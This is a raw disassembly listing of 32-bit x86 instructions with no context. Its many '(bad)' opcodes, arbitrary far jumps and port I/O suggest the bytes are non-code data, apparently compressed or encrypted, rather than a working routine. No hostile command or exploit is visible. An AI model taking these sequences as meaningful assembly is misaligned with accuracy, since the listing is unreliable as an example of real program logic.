  41301d:	lods   eax,DWORD PTR ds:[esi]
  41301e:	and    al,0x35
  413020:	jae    0x41308f
  413022:	sub    eax,0x18f02f69
  413027:	sbb    BYTE PTR [edi-0x6aefa8cf],ch
  41302d:	mov    edi,DWORD PTR [esi]
  41302f:	popf   
  413030:	xchg   edx,eax
  413031:	dec    eax
  413032:	call   0xb0e8:0xa5b837b3
  413039:	add    al,bh
  41303b:	adc    cl,ah
  41303d:	sbb    bl,BYTE PTR [ebp+0x2d]
  413040:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413041:	inc    edi
  413042:	in     eax,dx
  413043:	js     0x41306d
  413045:	adc    eax,DWORD PTR [esi+0x6b1d9356]
  41304b:	push   edx
  41304c:	jmp    0x412fd1
  41304e:	outs   dx,DWORD PTR ds:[esi]
  41304f:	nop
  413050:	leave  
  413051:	cli    
  413052:	in     al,0x7f
  413054:	mov    ch,0xa6
  413056:	(bad)  
  413057:	ins    DWORD PTR es:[edi],dx
  413058:	scas   al,BYTE PTR es:[edi]
  413059:	mov    al,ds:0x535c3707
  41305e:	lock cwde 
  413060:	clc    
  413061:	add    dl,0x8b
  413064:	daa    
  413065:	push   ss
  413066:	cmp    DWORD PTR [ebx],ebx
  413068:	xor    BYTE PTR [eax],ah
  41306a:	cmp    eax,0x77562d8
  41306f:	(bad)  
  413070:	pusha  
  413071:	jb     0x41304e
  413073:	cmp    DWORD PTR [eax+0x7d3bd55d],0xffffffab
  41307a:	jae    0x41307b
  41307c:	push   ss
  41307d:	fidivr DWORD PTR [esp+edx*4-0x68f96280]
  413084:	or     DWORD PTR [edx-0x8],ebx
  413087:	jp     0x413033
  413089:	jo     0x413071
  41308b:	inc    ecx
  41308c:	push   0x11
  41308e:	adc    esp,DWORD PTR [edx-0x53]
  413091:	cmp    BYTE PTR [edi-0x7bd420f3],bh
  413097:	sbb    al,BYTE PTR [ebx]
  413099:	pop    esp
  41309a:	and    eax,0x6d78638c
  41309f:	sub    DWORD PTR [ebp+0x469c5656],ebp
  4130a5:	ds inc edi
  4130a7:	aam    0xf9
  4130a9:	mov    dl,0xfd
  4130ab:	retf   0xba57
  4130ae:	ds sti 
  4130b0:	pop    ebp
  4130b1:	sub    BYTE PTR ds:0xe1cf37a3,bh
  4130b7:	shl    BYTE PTR [ebp-0x37],0xab
  4130bb:	or     eax,DWORD PTR ds:0x760472f8
  4130c1:	xchg   dh,dh
  4130c3:	xchg   esp,eax
  4130c4:	or     DWORD PTR [eax+0x2d16c00],0xffffffb8
  4130cb:	fwait
  4130cc:	arpl   WORD PTR [esi],di
  4130ce:	mov    bl,0x1d
  4130d0:	sbb    BYTE PTR [edi],ch
  4130d2:	or     al,0x68
  4130d4:	push   eax
  4130d5:	jmp    0x41313f
  4130d7:	xchg   ecx,eax
  4130d8:	mov    ds:0x4a63d40a,al
  4130dd:	mov    edx,ebp
  4130df:	xchg   ecx,eax
  4130e0:	jae    0x413132
  4130e2:	mov    eax,0xdedb41a0
  4130e7:	popf   
  4130e8:	push   0xb375bd0
  4130ed:	sahf   
  4130ee:	ret    
  4130ef:	rcr    eax,cl
  4130f1:	aam    0x6d
  4130f3:	sub    eax,0xcf4c3873
  4130f8:	jecxz  0x413175
  4130fa:	or     al,0x58
  4130fc:	pop    eax
  4130fd:	and    DWORD PTR [edi-0x3e],eax
  413100:	push   ecx
  413101:	adc    edx,DWORD PTR [ebx]
  413103:	and    BYTE PTR [edi-0x4c],al
  413106:	xchg   ecx,eax
  413107:	shl    BYTE PTR [edi],1
  413109:	cmp    ah,dh
  41310b:	jmp    0x6e0e:0xd20def78
  413112:	xchg   edx,eax
  413113:	popa   
  413114:	test   BYTE PTR [ebx-0x5e],cl
  413117:	stc    
  413118:	fidivr DWORD PTR [esi-0x4e]
  41311b:	mov    eax,0x8ba6f328
  413120:	dec    ebx
  413121:	jmp    0xd445:0xd3d10909
  413128:	push   DWORD PTR [ecx+0x5e]
  41312b:	mov    BYTE PTR [ebp-0x706abf21],bl
  413131:	int3   
  413132:	stos   BYTE PTR es:[edi],al
  413133:	pop    esi
  413134:	out    dx,eax
  413135:	pop    ds
  413136:	mov    al,ds:0xc8e076aa
  41313b:	jnp    0x41317a
  41313d:	(bad)  
  41313e:	mov    al,0x7c
  413140:	pusha  
  413141:	push   cs
  413142:	dec    ebx
  413143:	(bad)  
  413144:	mov    dl,0x3a
  413146:	jno    0x4130fd
  413148:	jae    0x41311b
  41314a:	sbb    al,0xf4
  41314c:	popf   
  41314d:	mov    ds:0x4d8240a,al
  413152:	shl    esi,cl
  413154:	push   esp
  413155:	cmp    al,0x65
  413157:	sbb    BYTE PTR [eax],ah
  413159:	fbstp  TBYTE PTR [esp+ebp*1-0x38d2454a]
  413160:	mov    edi,0xe5a59f8d
  413165:	mov    al,ds:0x6af5fd7c
  41316a:	fsubr  st(7),st
  41316c:	mov    eax,0xafe2a61a
  413171:	mov    ds:0xa8c2e3c3,al
  413176:	in     al,dx
  413177:	inc    eax
  413178:	(bad)  
  413179:	mov    cl,0x6d
  41317b:	sub    esi,DWORD PTR [edx+0x3fa01eb6]
  413181:	aas    
  413182:	pop    esp
  413183:	in     al,0x16
  413185:	(bad)  
  413186:	leave  
  413187:	sub    edi,DWORD PTR [eax]
  413189:	nop
  41318a:	not    DWORD PTR ds:0x649af8a0
  413190:	stos   BYTE PTR es:[edi],al
  413191:	retf   
  413192:	rol    ch,1
  413194:	sahf   
  413195:	out    dx,eax
  413196:	sbb    cl,BYTE PTR [ecx+0xd]
  413199:	or     DWORD PTR [edi+0x1e],ebx
  41319c:	add    eax,0x627fd1f6
  4131a1:	pop    edi
  4131a2:	inc    ebx
  4131a3:	stc    
  4131a4:	and    ax,0x2b3b
  4131a8:	mov    ecx,0xa403a236
  4131ad:	popa   
  4131ae:	fld    TBYTE PTR [ecx]
  4131b0:	jg     0x413165
  4131b2:	sahf   
  4131b3:	arpl   WORD PTR [ecx],ax
  4131b5:	and    DWORD PTR [ebx-0x3ca691c6],0x60f5717a
  4131bf:	jno    0x41319a
  4131c1:	or     eax,0xc650769f
  4131c6:	xor    esi,0x47
  4131c9:	xchg   esi,eax
  4131ca:	and    BYTE PTR [edi-0x5b22129b],ah
  4131d0:	enter  0xdc59,0x2e
  4131d4:	push   ebx
  4131d5:	rcr    DWORD PTR [edx+0x4236f5c9],cl
  4131db:	xchg   edi,eax
  4131dc:	or     BYTE PTR [eax-0x50c13717],0x1f
  4131e3:	fimul  WORD PTR [ecx+0x4474bf4e]
  4131e9:	or     DWORD PTR [edi],ecx
  4131eb:	pop    es
  4131ec:	sbb    al,0x61
  4131ee:	pop    ecx
  4131ef:	scas   eax,DWORD PTR es:[edi]
  4131f0:	add    edx,ebx
  4131f2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4131f3:	fwait
  4131f4:	mov    al,0x25
  4131f6:	sub    esi,DWORD PTR [ecx+0x76c6826b]
  4131fc:	ins    BYTE PTR es:[edi],dx
  4131fd:	sbb    DWORD PTR [ecx+0x9],edi
  413200:	jmp    0x413221
  413202:	mov    ebx,0xc868cf38
  413207:	jb     0x413286
  413209:	mov    esi,gs
  41320b:	outs   dx,DWORD PTR ds:[esi]
  41320c:	mov    ch,BYTE PTR [esi]
  41320e:	in     al,0xf7
  413210:	cld    
  413211:	rcr    BYTE PTR [ecx-0x110847ee],cl
  413217:	sahf   
  413218:	outs   dx,BYTE PTR ds:[esi]
  413219:	push   edi
  41321a:	imul   edx,DWORD PTR [eax+0x5a],0xffffffbe
  41321e:	xor    bl,ah
  413220:	stc    
  413221:	lods   al,BYTE PTR ds:[esi]
  413222:	pop    DWORD PTR [edi+ecx*1+0xff955e2]
  413229:	cmp    al,0x98
  41322b:	mov    WORD PTR [ebp+0x62389281],ds
  413231:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413232:	add    DWORD PTR [esi-0x66],edi
  413235:	gs pop ebx
  413237:	mov    dl,0xad
  413239:	xor    eax,0xda180463
  41323e:	fistp  WORD PTR [ebx+esi*4]
  413241:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413242:	imul   eax,DWORD PTR [ecx-0x3f93f3f4],0x2d
  413249:	shr    BYTE PTR [eax],cl
  41324b:	cmp    ch,BYTE PTR [esi+0x7a]
  41324e:	(bad)  
  41324f:	jnp    0x4131e2
  413251:	jecxz  0x4131f3
  413253:	xchg   ebx,eax
  413254:	add    esi,DWORD PTR [edi+eiz*4]
  413257:	sbb    edi,DWORD PTR [ebp-0x26]
  41325a:	push   esp
  41325b:	in     eax,dx
  41325c:	mov    esp,0x7e84eaad
  413261:	(bad)  
  413262:	nop
  413263:	(bad)  
  413264:	fst    DWORD PTR [edi]
  413266:	pop    eax
  413267:	push   0x90363638
  41326c:	aas    
  41326d:	mov    edx,0x96b622ee
  413272:	or     eax,0x6aa1a106
  413277:	xlat   BYTE PTR ds:[ebx]
  413278:	inc    edi
  413279:	pusha  
  41327a:	retf   0x3a9f
  41327d:	or     al,0xcb
  41327f:	outs   dx,DWORD PTR ds:[esi]
  413280:	jbe    0x413249
  413282:	lock mov BYTE PTR [edx-0x41],0x49
  413287:	adc    eax,0x7acda9c6
  41328c:	inc    edi
  41328d:	scas   eax,DWORD PTR es:[edi]
  41328e:	bound  edx,QWORD PTR [ecx-0x46]
  413291:	jmp    0x9d54:0x534207f0
  413298:	sbb    eax,0x8f8ab762
  41329d:	lock imul cl
  4132a0:	mov    dh,0xab
  4132a2:	pop    ebx
  4132a3:	xor    BYTE PTR [esi+eax*2],0x50
  4132a7:	ret    0x1d4b
  4132aa:	sub    al,0x83
  4132ac:	out    0xd1,eax
  4132ae:	cmp    eax,0xfaf13c2
  4132b3:	shr    BYTE PTR [edi],0x9f
  4132b6:	repz in eax,0x2
  4132b9:	push   ecx
  4132ba:	test   eax,0xcf57d9f3
  4132bf:	out    0x71,al
  4132c1:	repz jno 0x413327
  4132c4:	mov    al,ds:0xd11933b3
  4132c9:	stc    
  4132ca:	jecxz  0x4132bc
  4132cc:	pop    ebp
  4132cd:	ins    DWORD PTR es:[edi],dx
  4132ce:	push   ecx
  4132cf:	ret    
  4132d0:	hlt    
  4132d1:	jecxz  0x413343
  4132d3:	mov    eax,0x99cc61af
  4132d8:	mov    eax,esp
  4132da:	arpl   WORD PTR [edi],di
  4132dc:	inc    eax
  4132dd:	(bad)  
  4132de:	pop    edi
  4132df:	push   ss
  4132e0:	(bad)  
  4132e1:	fnsave [edi+0xc42e0a5]
  4132e7:	call   0x1241:0xb5375a54
  4132ee:	and    BYTE PTR [edi+0x302532de],0x4c
  4132f5:	cmc    
  4132f6:	and    bl,BYTE PTR [eax+0xd3fa98f]
  4132fc:	jae    0x41331a
  4132fe:	pop    esi
  4132ff:	cmc    
  413300:	sbb    cl,dl
  413302:	inc    ecx
  413304:	daa    
  413305:	imul   edx,edi,0xc8efd45c
  41330b:	aam    0xa9
  41330d:	imul   DWORD PTR [edi]
  41330f:	push   edx
  413310:	mov    ebx,ds
  413312:	xchg   ebp,eax
  413313:	mov    bl,0x32
  413315:	pushf  
  413316:	or     bh,BYTE PTR [edi+edi*4+0x715503b8]
  41331d:	outs   dx,BYTE PTR ds:[esi]
  41331e:	and    bh,BYTE PTR [edi+0x3d]
  413321:	adc    al,0x2e
  413323:	mov    dh,0xd9
  413325:	repnz cmc 
  413327:	enter  0xaf92,0x87
  41332b:	or     DWORD PTR [eax*1+0x5c730267],ebp
  413332:	ret    
  413333:	cmc    
  413334:	data16 fist DWORD PTR [esp+esi*2-0x29aa0c3b]
  41333c:	cmp    BYTE PTR [ebx+esi*4+0x28af7d9a],dh
  413343:	jbe    0x4132e6
  413345:	jmp    0x619a2ca6
  41334a:	out    dx,al
  41334b:	push   edi
  41334c:	mov    edx,0x7fb984c0
  413351:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413352:	xchg   esp,eax
  413353:	pushf  
  413354:	icebp  
  413355:	out    dx,al
  413356:	inc    eax
  413357:	cmc    
  413358:	arpl   dx,si
  41335a:	and    edx,DWORD PTR ds:0xe3826b29
  413360:	push   es
  413361:	dec    edi
  413362:	popf   
  413363:	xchg   edi,eax
  413364:	cmp    eax,0x11f681a7
  413369:	inc    edi
  41336a:	jl     0x41330f
  41336c:	cld    
  41336d:	lahf   
  41336e:	mov    eax,0xb1eb67c5
  413373:	fst    QWORD PTR ds:0xc9aff6a8
  413379:	cmp    al,0xdc
  41337b:	xchg   esi,eax
  41337c:	in     al,dx
  41337d:	mov    al,ds:0x7964bb37
  413382:	pop    esp
  413383:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413384:	push   ebx
  413385:	or     BYTE PTR [eax-0x6defc74f],al
  41338b:	shr    bh,1
  41338d:	mov    bl,0x63
  41338f:	inc    esp
  413390:	sbb    bl,bl
  413392:	xchg   ecx,eax
  413393:	cmc    
  413394:	addr16 pop ds
  413396:	repz or eax,DWORD PTR [ebp+0x7ca0ef06]
  41339d:	scas   al,BYTE PTR es:[edi]
  41339e:	enter  0x9203,0x5f
  4133a2:	nop
  4133a3:	or     ecx,eax
  4133a5:	sbb    DWORD PTR [esi],eax
  4133a7:	pop    edx
  4133a8:	repz test eax,0xcb045dcc
  4133ae:	adc    al,0x37
  4133b0:	cld    
  4133b1:	mov    esp,0x9e3774d3
  4133b6:	inc    esi
  4133b7:	aaa    
  4133b8:	xchg   ebp,eax
  4133b9:	xor    DWORD PTR [eax-0x4b],ecx
  4133bc:	inc    eax
  4133bd:	or     bh,BYTE PTR [ebp+0x49]
  4133c0:	add    al,0xe4
  4133c2:	jge    0x41342d
  4133c4:	mov    DWORD PTR [eax],esi
  4133c6:	cwde   
  4133c7:	jns    0x41339a
  4133c9:	sbb    eax,0x634f426c
  4133ce:	and    DWORD PTR [eax-0x59],edi
  4133d1:	loope  0x413388
  4133d3:	inc    edx
  4133d4:	mul    BYTE PTR [ebx]
  4133d6:	cli    
  4133d7:	inc    esp
  4133d8:	jmp    0x9b76e711
  4133dd:	sbb    BYTE PTR [ecx+0x2d],ch
  4133e0:	mov    ?,WORD PTR [edx-0x75]
  4133e3:	cmp    eax,0xfff9336
  4133e8:	leave  
  4133e9:	popf   
  4133ea:	pop    eax
  4133eb:	jae    0x41343f
  4133ed:	and    dh,ch
  4133ef:	sbb    al,bh
  4133f1:	call   0x8b2d7974
  4133f6:	imul   ebx,esp,0xe36edd42
  4133fc:	add    DWORD PTR [eax+0x15b41172],0xffffff85
  413403:	push   es
  413404:	sub    BYTE PTR [edi-0x14],dl
  413407:	dec    DWORD PTR [eax+edi*2]
  41340a:	shr    DWORD PTR ds:0x6d71216,cl
  413410:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413411:	sub    DWORD PTR [ebp+0x2c0ce5dc],0xffffff82
  413418:	cmp    al,0x40
  41341a:	xchg   ebx,eax
  41341b:	mov    al,0x5e
  41341d:	pop    ebp
  41341e:	sbb    al,ah
  413420:	jg     0x41347d
  413422:	jmp    0x413478
  413424:	aad    0xb9
  413426:	ja     0x41342b
  413428:	xlat   BYTE PTR ds:[ebx]
  413429:	fwait
  41342a:	dec    esp
  41342b:	pop    es
  41342c:	mov    eax,0x902912bb
  413431:	and    BYTE PTR [ebp-0x35],0x3
  413435:	cmp    bl,bl
  413437:	cs push edx
  413439:	mov    edx,0xf2daef71
  41343e:	imul   esi,edx,0x29
  413441:	add    dl,BYTE PTR [ebp+0x47]
  413444:	rol    dl,cl
  413446:	jnp    0x413479
  413448:	sbb    al,0xc6
  41344a:	sub    ebp,ebx
  41344c:	mov    dh,0x5d
  41344e:	cs and eax,0xb00f1020
  413454:	in     al,0x3c
  413456:	xchg   BYTE PTR [esi-0xf],dl
  413459:	sti    
  41345a:	call   0xa5aa607c
  41345f:	add    BYTE PTR [ebx-0x115793e7],al
  413465:	mov    DWORD PTR [ecx],0x9b1fe918
  41346b:	fbstp  TBYTE PTR [eax+0x4b4ee1f3]
  413471:	gs mov dl,0x5f
  413474:	rcl    BYTE PTR [ecx-0x59],cl
  413477:	dec    esi
  413478:	(bad)  
  413479:	call   0x7fabd128
  41347e:	or     al,0x81
  413480:	sbb    esi,DWORD PTR [ecx+ecx*1+0x593608ed]
  413487:	cmp    DWORD PTR [ecx-0x117b0192],edx
  41348d:	je     0x4134bb
  41348f:	jno    0x4134e2
  413491:	cmp    dl,ch
  413493:	ins    BYTE PTR es:[edi],dx
  413494:	xor    ecx,DWORD PTR ds:0x65
	...
  413512:	add    BYTE PTR [eax],al
  413514:	call   0xbb94:0xbf94b5b1
  41351b:	mov    edi,0x1b5d8b00
  413520:	jle    0x41353a
  413522:	xor    DWORD PTR [ebx],ecx
  413524:	(bad)  
  413526:	add    BYTE PTR [eax],al
  413528:	imul   eax,DWORD PTR [edi],0x0
  41352b:	add    BYTE PTR [ecx-0x7403611b],ch
  413531:	cdq    
  413532:	pop    ss
  413533:	(bad)  
  413535:	test   eax,0x6990dd8c
  41353a:	pop    esi
  41353b:	in     al,dx
  41353c:	rcl    BYTE PTR [ebp+0x37],0x56
  413540:	pop    ebp
  413541:	jecxz  0x4134e2
  413543:	push   ss
  413544:	ffree  st(2)
  413546:	aad    0x99
  413548:	rcr    BYTE PTR [edx-0x6a2024f5],cl
  41354e:	ja     0x4134f7
  413550:	outs   dx,BYTE PTR ds:[esi]
  413551:	adc    al,0x7b
  413553:	dec    edx
  413554:	mov    es,WORD PTR [ecx+0x5d]
  413557:	adc    eax,0x31b3432e
  41355c:	push   ebx
  41355d:	in     eax,dx
  41355e:	popa   
  41355f:	ss push esi
  413562:	mov    esp,0x6e39b6ab
  413567:	sub    al,0xd0
  413569:	cmp    edi,0xfffffff6
  41356c:	push   edi
  41356d:	int    0xf6
  41356f:	scas   eax,DWORD PTR es:[edi]
  413570:	add    edx,eax
  413572:	and    DWORD PTR [edx],eax
  413574:	adc    BYTE PTR [ebx+0x22],bl
  413577:	push   cs
  413578:	xchg   esp,eax
  413579:	cmp    esi,DWORD PTR [ebx-0x5a8fefdc]
  41357f:	jl     0x4135a8
  413581:	push   ebp
  413582:	int3   
  413583:	sub    ah,BYTE PTR [esi]
  413585:	sub    esi,DWORD PTR [ecx-0x2617a15c]
  41358b:	jb     0x41358b
  41358d:	push   edi
  41358e:	jl     0x413596
  413590:	test   BYTE PTR [ebx],al
  413592:	cli    
  413593:	sbb    eax,0x8a7da82a
  413598:	hlt    
  413599:	inc    ebp
  41359a:	sbb    esp,DWORD PTR [edx-0x3209a7b2]
  4135a0:	and    BYTE PTR [ebx+edx*1],ch
  4135a3:	sbb    BYTE PTR [edx-0x3637e221],al
  4135a9:	(bad)  
  4135aa:	je     0x4135cc
  4135ac:	mov    edi,0xbd9294f5
  4135b1:	xchg   esi,eax
  4135b2:	add    al,0x54
  4135b4:	add    eax,DWORD PTR [esi-0x71a2b9d4]
  4135ba:	fidiv  WORD PTR [eax-0x71]
  4135bd:	aas    
  4135be:	test   cl,bh
  4135c0:	add    ebp,DWORD PTR [edi+edi*2]
  4135c3:	aad    0x9d
  4135c5:	and    al,ah
  4135c7:	stos   BYTE PTR es:[edi],al
  4135c8:	add    al,0x6
  4135ca:	dec    esp
  4135cb:	fdiv   st(6),st
  4135cd:	pop    ecx
  4135ce:	dec    esp
  4135cf:	adc    ebp,eax
  4135d1:	lods   al,BYTE PTR ds:[esi]
  4135d2:	dec    esi
  4135d3:	das    
  4135d4:	sub    edi,DWORD PTR [edx+0x54f5d74f]
  4135da:	xchg   cx,ax
  4135dc:	inc    eax
  4135dd:	(bad)  
  4135de:	call   0x4c3ca03a
  4135e3:	out    0x15,al
  4135e5:	mov    eax,DWORD PTR [ecx+edx*2+0x4d84a272]
  4135ec:	dec    edi
  4135ed:	jge    0x41365a
  4135ef:	call   0x15a0:0x2001043
  4135f6:	fs (bad) 
  4135f8:	std    
  4135f9:	sub    DWORD PTR [esp+eax*8+0x1e80bd64],ebp
  413600:	(bad)  
  413601:	jecxz  0x4135c0
  413603:	in     al,0x71
  413605:	pop    ds
  413606:	xor    edx,DWORD PTR [esi+eiz*1]
  413609:	mov    eax,0xc33ac4a9
  41360e:	(bad)  
  41360f:	pushf  
  413610:	pop    ds
  413611:	and    dl,BYTE PTR [eax+0x65]
  413614:	pop    ss
  413615:	mov    ds:0xa4fbd961,al
  41361a:	imul   edx,DWORD PTR [ecx-0x2c6e08ee],0x20
  413621:	push   ebp
  413622:	cmp    eax,0x95b04af0
  413627:	lods   eax,DWORD PTR ds:[esi]
  413628:	push   edi
  413629:	fsub   st(3),st
  41362b:	out    0xc1,al
  41362d:	pusha  
  41362e:	(bad)  
  41362f:	test   eax,0x7cc4a131
  413634:	clc    
  413635:	ja     0x413661
  413637:	loop   0x41369e
  413639:	inc    ebx
  41363a:	icebp  
  41363b:	imul   ecx,DWORD PTR [ecx-0x2d63dd44],0x49
  413642:	fdivr  QWORD PTR [esi+0x3eeaddca]
  413648:	mov    ebx,0x324d5f6f
  41364d:	leave  
  41364e:	in     al,0x9a
  413650:	clc    
  413651:	dec    ebx
  413652:	dec    edx
  413653:	cwde   
  413654:	mov    esi,0x6cad2156
  413659:	cmp    al,0x71
  41365b:	mov    esp,0xd46cee55
  413660:	(bad)  [ecx-0x582d2312]
  413666:	push   ebp
  413667:	fiadd  DWORD PTR [eax-0x10d80b88]
  41366d:	bnd jne 0x41363c
  413670:	imul   edx,edi,0xfffffff1
  413673:	(bad)  
  413674:	pop    eax
  413675:	push   ecx
  413676:	mov    esp,0x5d92ba70
  41367b:	mov    ecx,0x8b832bdc
  413680:	out    dx,al
  413681:	adc    BYTE PTR [edx+0x54],0xac
  413685:	hlt    
  413686:	sbb    BYTE PTR [edi-0x45],bl
  413689:	mov    edx,0xb9163b94
  41368e:	mov    WORD PTR [esi],?
  413690:	jb     0x41369a
  413692:	sub    DWORD PTR [ecx],esp
  413694:	fwait
  413695:	les    eax,FWORD PTR [esi-0x1258f40f]
  41369b:	pop    ebx
  41369c:	sti    
  41369d:	sbb    bh,0x87
  4136a0:	xchg   esp,eax
  4136a1:	cmc    
  4136a2:	sbb    BYTE PTR [edi],dh
  4136a4:	lock test al,0x62
  4136a7:	adc    BYTE PTR [ecx],al
  4136a9:	and    BYTE PTR [ebx-0x67c94e4],dh
  4136af:	jb     0x4136ab
  4136b1:	hlt    
  4136b2:	push   eax
  4136b3:	leave  
  4136b4:	rcr    eax,0x3
  4136b7:	mov    edi,0x83b456a0
  4136bc:	jle    0x413656
  4136be:	and    dl,BYTE PTR [esi+ebp*1+0x2f9745f3]
  4136c5:	xchg   esi,eax
  4136c6:	cmp    eax,0xb80f1c54
  4136cb:	pop    edi
  4136cc:	cmc    
  4136cd:	mov    al,ds:0xa42e0ea9
  4136d2:	repnz data16 adc al,0x6d
  4136d6:	or     WORD PTR [esi-0x1fe17794],0xed6
  4136df:	dec    ecx
  4136e0:	ror    BYTE PTR [ebx+edx*4-0x40],1
  4136e4:	inc    eax
  4136e5:	out    dx,al
  4136e6:	pop    edx
  4136e7:	lods   al,BYTE PTR ds:[esi]
  4136e8:	push   ecx
  4136e9:	mov    dl,0xc1
  4136eb:	cwde   
  4136ec:	mov    al,ds:0xd560690b
  4136f1:	je     0x41373e
  4136f3:	(bad)  
  4136f4:	pop    edi
  4136f5:	iret   
  4136f6:	inc    esp
  4136f7:	jmp    DWORD PTR [edi]
  4136f9:	xor    al,0xd4
  4136fb:	not    ch
  4136fd:	inc    esi
  4136fe:	out    0x1f,al
  413700:	xchg   DWORD PTR [esi-0x7ca23acc],ebp
  413706:	add    ch,BYTE PTR [edi-0x12]
  413709:	push   ecx
  41370a:	jnp    0x4136b7
  41370c:	mov    eax,edx
  41370e:	imul   ecx,ebx,0xdabbfc68
  413714:	loop   0x413706
  413716:	sub    eax,0x50ef5158
  41371b:	jb     0x413728
  41371d:	pushf  
  41371e:	jle    0x413766
  413720:	sbb    DWORD PTR [eax-0x5a],eax
  413723:	cmp    BYTE PTR [eax-0x37],al
  413726:	and    DWORD PTR [ecx],edi
  413728:	inc    eax
  413729:	push   cs
  41372a:	pusha  
  41372b:	xchg   ebp,eax
  41372c:	mov    edi,0xa2e22dca
  413731:	xor    eax,0x5d9421e8
  413736:	or     esi,DWORD PTR [ebx+0x1cb55b7c]
  41373c:	add    DWORD PTR [ebx+0x36],esi
  41373f:	cmp    ebx,DWORD PTR [ecx]
  413741:	pop    esp
  413742:	leave  
  413743:	loope  0x4136cd
  413745:	mov    dh,0x51
  413747:	out    0x35,al
  413749:	mov    ebp,0x88842dc6
  41374e:	cmp    bh,dl
  413750:	pushf  
  413751:	mov    ah,BYTE PTR [esi+ebp*1+0x15]
  413755:	and    eax,0x568f88af
  41375a:	or     esp,DWORD PTR [edx]
  41375c:	sbb    ch,BYTE PTR [ecx+0x23]
  41375f:	addr16 sbb al,0xd6
  413762:	jmp    0x54c4b9fc
  413767:	dec    edx
  413768:	mov    ebx,cs
  41376a:	imul   ebp,DWORD PTR [edx-0x5de0ef14],0xf57f0a17
  413774:	and    eax,0x14073417
  413779:	jae    0x4137df
  41377b:	jne    0x4137e8
  41377d:	cmp    DWORD PTR [esi-0x1000f279],0xffffffeb
  413784:	hlt    
  413785:	inc    ebp
  413786:	aam    0x70
  413788:	mov    edx,0xb449930f
  41378d:	popf   
  41378e:	or     ch,BYTE PTR [eax+0x7f00db54]
  413794:	imul   esp,DWORD PTR [eax+0x6d],0xffffffbd
  413798:	xlat   BYTE PTR ds:[ebx]
  413799:	sub    al,bh
  41379b:	inc    eax
  41379c:	or     BYTE PTR [ebx+eiz*2-0x219b9bfa],ah
  4137a3:	fnstenv [ebp+0x75]
  4137a6:	push   ds
  4137a7:	stc    
  4137a8:	das    
  4137a9:	mov    esp,DWORD PTR [ecx+0x7bf190ab]
  4137af:	call   0x3cdb944f
  4137b4:	int    0xe4
  4137b6:	mov    ds:0x96a556b0,al
  4137bb:	daa    
  4137bc:	ins    BYTE PTR es:[edi],dx
  4137bd:	loopne 0x4137b5
  4137bf:	and    edi,DWORD PTR [edi-0x35d1a8ea]
  4137c5:	int    0x54
  4137c7:	push   es
  4137c8:	xor    dl,BYTE PTR [eax-0x37]
  4137cb:	cmp    esi,esp
  4137cd:	mov    BYTE PTR [ecx+0x6f],cl
  4137d0:	add    eax,0xc3704e51
  4137d5:	(bad)  
  4137d6:	sub    DWORD PTR [esi+0x14f75bea],esi
  4137dc:	retf   
  4137dd:	(bad)  
  4137de:	fstp   QWORD PTR [ecx-0x12]
  4137e1:	shl    BYTE PTR [esp+esi*4],cl
  4137e4:	std    
  4137e5:	jle    0x41382c
  4137e7:	stc    
  4137e8:	jecxz  0x41383d
  4137ea:	gs mov bh,0x7f
  4137ed:	push   0xffffff96
  4137ef:	pushf  
  4137f0:	and    eax,0xab7c98f5
  4137f5:	add    esi,DWORD PTR [ecx+eax*4+0x28]
  4137f9:	lea    esp,[eax+0x65a08200]
  4137ff:	iret   
  413800:	sti    
  413801:	mov    WORD PTR [ebp-0x58326c7],?
  413807:	jge    0x4137ab
  413809:	or     al,0x7
  41380b:	mov    ebx,0x79152cfd
  413810:	daa    
  413811:	hlt    
  413812:	sub    eax,0x940035d2
  413817:	sub    edi,ecx
  413819:	jmp    0x413809
  41381b:	mov    ebx,0xcf4695a7
  413820:	xchg   ebp,eax
  413821:	out    dx,al
  413822:	outs   dx,BYTE PTR ds:[esi]
  413823:	dec    ebp
  413824:	dec    eax
  413825:	ja     0x413888
  413827:	cmp    al,0x8d
  413829:	int3   
  41382a:	cmp    DWORD PTR ds:0x334a83d5,ebp
  413830:	lahf   
  413831:	adc    DWORD PTR [edi],0xffffff82
  413834:	or     eax,0x1a9791b4
  413839:	pop    es
  41383a:	cmp    ah,al
  41383c:	mov    dl,0xb8
  41383e:	adc    eax,0x45e84711
  413843:	lods   al,BYTE PTR gs:[esi]
  413845:	stc    
  413846:	sbb    ah,BYTE PTR [edi]
  413848:	push   ebx
  413849:	adc    ch,BYTE PTR ds:0x18f539db
  41384f:	add    BYTE PTR [esi+0x2f92b1d1],bl
  413855:	jmp    0x41387c
  413857:	iret   
  413858:	xchg   esi,eax
  413859:	fwait
  41385a:	and    bh,BYTE PTR [esi]
  41385c:	lea    ebp,[esi-0x2ebe96af]
  413862:	mov    dl,0xe9
  413864:	mov    al,ds:0x2ec198da
  413869:	sub    DWORD PTR [eax+0x5d2788a5],ebp
  41386f:	mov    bl,0x59
  413871:	add    esi,ecx
  413873:	inc    ecx
  413874:	test   BYTE PTR [edx-0x50],bh
  413877:	jg     0x41383a
  413879:	pop    edx
  41387a:	into   
  41387b:	mov    edx,0x759f842b
  413880:	fisttp QWORD PTR [eax]
  413882:	ds stos DWORD PTR es:[edi],eax
  413884:	in     eax,0xb
  413886:	xor    eax,eax
  413888:	inc    esp
  413889:	(bad)  
  41388a:	ret    
  41388b:	xor    eax,0x4a26edea
  413890:	pop    ebx
  413891:	push   es
  413892:	cmp    BYTE PTR [esi+0x26ef5dc4],0x4f
  413899:	xchg   ecx,eax
  41389a:	jb     0x4138f3
  41389c:	xchg   DWORD PTR [eax-0xdb47204],ebx
  4138a2:	iret   
  4138a3:	rol    DWORD PTR [ecx+esi*4],1
  4138a6:	out    dx,al
  4138a7:	scas   al,BYTE PTR es:[edi]
  4138a8:	jg     0x4138d3
  4138aa:	mov    dl,0x25
  4138ac:	scas   al,BYTE PTR es:[edi]
  4138ad:	jnp    0x4138c3
  4138af:	jmp    0xa7c5:0x66a85bcb
  4138b6:	sbb    esi,DWORD PTR ss:[bp+si]
  4138ba:	pop    ebp
  4138bb:	add    DWORD PTR ds:0x7ed1220b,0xb244a3d3
  4138c5:	imul   ebx
  4138c7:	dec    ebx
  4138c8:	pop    eax
